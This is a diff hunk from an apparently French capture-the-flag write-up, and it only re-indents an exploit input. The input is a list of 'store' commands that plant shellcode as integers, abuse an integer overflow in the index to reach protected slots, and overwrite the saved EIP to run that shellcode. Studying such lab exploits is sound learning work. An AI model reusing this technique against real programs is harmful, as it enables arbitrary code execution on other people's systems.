@@ -63,25 +63,25 @@ J'ai choisi le shellcode suivant (23 bytes) : http://shell-storm.org/shellcode/f
 
 Et voici notre exploit : 
 
-store
-1750122545        shellcode 1
-1073741824        data[0] via OF
-store
-1752379183	
-1
-store
-1768042344
-2
-store
-1357089134    
-1073741827				data[3] via OF
-store
-2967570771	
-4
-store
-8441099				
-5
-store
-4294956388				data[0] adresse
-1073741938				data[114] (save eip)
-quit
+		store
+		1750122545        shellcode 1
+		1073741824        data[0] via OF
+		store
+		1752379183	
+		1
+		store
+		1768042344
+		2
+		store
+		1357089134    
+		1073741827				data[3] via OF
+		store
+		2967570771	
+		4
+		store
+		8441099				
+		5
+		store
+		4294956388				data[0] adresse
+		1073741938				data[114] (save eip)
+		quit
